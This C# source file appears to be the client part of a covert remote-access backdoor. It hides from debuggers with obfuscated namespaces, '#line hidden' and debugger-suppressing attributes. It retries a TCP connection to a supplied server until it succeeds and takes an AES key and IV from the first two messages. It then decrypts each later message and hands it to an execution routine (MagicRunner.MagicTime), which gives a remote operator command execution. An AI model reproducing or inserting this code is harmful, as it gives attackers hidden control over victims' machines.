using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;

#line hidden
namespace _.__._0x0002
{
    [DebuggerStepThrough]
    [DebuggerNonUserCode]
    internal class Consumer
    {
        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        private readonly static Type[] _managers =
        {
            typeof(_.__._0x0006.SM)
        };

        [DebuggerStepThrough]
        [DebuggerHidden]
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
        internal Consumer()
        {
            try
            {
                foreach (var manager in _managers)
                {
                    RuntimeHelpers.RunClassConstructor(manager.TypeHandle);
                }

            }
            catch (Exception ex)
            {
                throw;
            }
        }
        [DebuggerStepThrough]
        [DebuggerHidden]
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
        internal void ConnectToServer(string li, int p)
        {
            var c = default(TcpClient);
            var f = true;
            var ff = false;
            var k = Array.Empty<byte>();
            var sk = Array.Empty<byte>();


            void e() => c = new TcpClient(li, p);
            while (c == null)
            {
                try
                {
                    e();
                }
                catch
                {
                    continue;
                }
            }
            try
            {
                var s = c.GetStream();

                while (true)
                {
                    var b = new byte[1024 * 64];
                    var br = s.Read(b, 0, b.Length);
                    var v = b.SkipLast((1024 * 64) - br).ToArray();

                    if (ff || f)
                    {
                        if (ff)
                        {
                            sk = v;
                            ff = false;
                        }
                        if (f)
                        {
                            k = v;
                            f = false;
                            ff = true;
                        }
                    }
                    else
                    {
                        if (br < 55) continue;

                        var i = _.__._0x0006.SM.DS.DS<string>(v, d: true);
                        if (i.Error == _.__._0x0006.SCSS.SE.None)
                        {
                            var o = i.Output.Value;

                            [DebuggerStepThrough]
                            [DebuggerHidden]
                            [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
                            string op() => _0x0001.MagicRunner.MagicTime(D(o, k, sk));

                            if (!string.IsNullOrEmpty(o))
                                op();
                        }
                    }

                    Task.Delay(1000).Wait();
                }
            }
            catch
            {
                return;
            }
            finally
            {
                c?.Close();
            }
        }

        static string D(string cipherText, byte[] key, byte[] iv) { using (var aesAlg = Aes.Create()) { aesAlg.Key = key; aesAlg.IV = iv; var decryptor = aesAlg.CreateDecryptor(); using (var msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText))) using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) using (var srDecrypt = new StreamReader(csDecrypt)) return srDecrypt.ReadToEnd(); } }
    }
}
#line default